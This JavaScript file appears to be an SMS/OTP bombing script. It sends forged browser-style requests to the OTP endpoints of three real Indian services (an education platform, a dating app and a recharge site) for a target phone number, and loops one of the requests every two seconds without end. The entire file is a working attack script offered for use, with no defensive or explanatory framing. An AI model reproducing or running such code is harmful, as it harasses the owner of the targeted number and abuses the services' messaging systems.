const phone = 123;

const brutefun = async () => {
  // this is 403 forbidden for now 5 PM 29/08 check later
  const res = await fetch(
    "https://api.allen-live.in/api/v1/auth/sendOtp?center_id=&source=home-page-login",
    {
      headers: {
        accept: "application/json",
        "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
        baggage:
          "sentry-environment=production,sentry-release=20260821-135229,sentry-public_key=faf6a73a3042fbbe7094de5adeb3049e,sentry-trace_id=2bac78dd82314f78b0d81d668d1eae2d,sentry-sample_rate=0.05,sentry-sampled=false",
        "content-type": "application/json",
        priority: "u=1, i",
        "sec-ch-ua":
          '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
        "sentry-trace": "2bac78dd82314f78b0d81d668d1eae2d-ae3c14e2ee111cea-0",
        "x-client-type": "web",
        "x-device-id": "12917231-1242-46f4-9ce6-3d9d0f8e87e6",
        "x-referrer": "https://allen.in/",
        Referer: "https://allen.in/",
      },
      body: `{"country_code":"91","phone_number":"${phone}","persona_type":"TEACHER","otp_type":"SHARED_DEFAULT"}`,
      method: "POST",
    },
  );
  // const data = await res.json();
  console.log(res);
};

const fetchTruly = async () => {
  const res = await fetch(
    "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
    {
      headers: {
        accept: "application/json, text/javascript, */*; q=0.01",
        "accept-language": "en",
        app_version_code: "1316",
        app_version_name: "7.0.4",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        priority: "u=1, i",
        "sec-ch-ua":
          '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        source: "web_pwa",
        "system-language": "en",
        Referer: "https://trulymadly.com/",
      },
      body: `country_code=91&mobile=${phone}`,
      method: "POST",
    },
  );
  const data = await res.json();
  console.log(data);
};

const bruterecharge = async () => {
  const res = await fetch("https://api.recharge24.in/auth/sendotp", {
    headers: {
      accept: "*/*",
      "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
      "content-type": "application/json",
      priority: "u=1, i",
      "sec-ch-ua":
        '"Not=A?Brand";v="99", "Google Chrome";v="151", "Chromium";v="151"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-site",
      Referer: "https://app.recharge24.in/",
    },
    body: '{"hash":"U2FsdGVkX1+6DAWG5xDtG1O474KSmyUvDMSELFiildk="}',
    method: "POST",
  });
  const data = await res.json();
  console.log(data);
};

async function startLoop() {
  await brutefun(); // Wait for the function to finish completely

  // Schedule the next run in 1 minute
  setTimeout(startLoop, 2000);
}

startLoop();
